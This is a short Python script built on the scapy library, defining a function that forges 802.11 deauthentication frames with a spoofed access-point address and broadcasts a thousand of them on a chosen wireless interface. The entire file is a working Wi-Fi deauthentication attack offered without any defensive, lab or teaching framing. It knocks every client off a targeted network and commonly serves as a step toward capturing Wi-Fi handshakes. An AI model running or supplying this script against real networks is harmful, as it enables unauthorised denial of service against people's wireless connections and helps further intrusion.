
from scapy.all import *
from scapy import *


def deauth(interface, bssid_addr, destination_addr = 'ff:ff:ff:ff:ff:ff'):
    dot11 = Dot11(addr1=destination_addr, addr2=bssid_addr, addr3=bssid_addr)
    pkt = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(pkt, iface=interface, inter=0.1, count=1000, verbose=1)